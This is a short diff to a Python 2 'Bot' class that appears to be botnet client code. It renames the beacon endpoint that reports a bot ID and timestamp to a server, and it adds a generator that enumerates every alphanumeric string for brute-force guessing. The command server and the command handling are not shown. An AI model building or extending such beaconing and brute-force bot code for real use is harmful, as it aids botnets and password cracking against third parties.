@@ -1,4 +1,7 @@
 import httplib, urllib, socket, hashlib, time, platform
+from string import ascii_uppercase, ascii_lowercase, digits
+from itertools import product
+
 
 class Bot(object):
     def __init__(self):
@@ -22,7 +25,7 @@ class Bot(object):
     def beacon(self):
         t = int(time.time())
         bParams = {'botId' : self.id, 't' : t}
-        return self.post(bParams, '/cmd/').read()
+        return self.post(bParams, '/beacon/').read()
 
 
 
@@ -48,6 +51,12 @@ class Bot(object):
     def roundDown(self, num, factor):
         return num - (num%factor)
 
+    def genWordList(self, low, high):
+        chars = ascii_lowercase + ascii_uppercase + digits
+        for n in range(low, high):
+            for comb in product(chars, repeat=n):
+                string = "".join(comb)
+                yield string
 
 if __name__ == "__main__":
     bot = Bot()
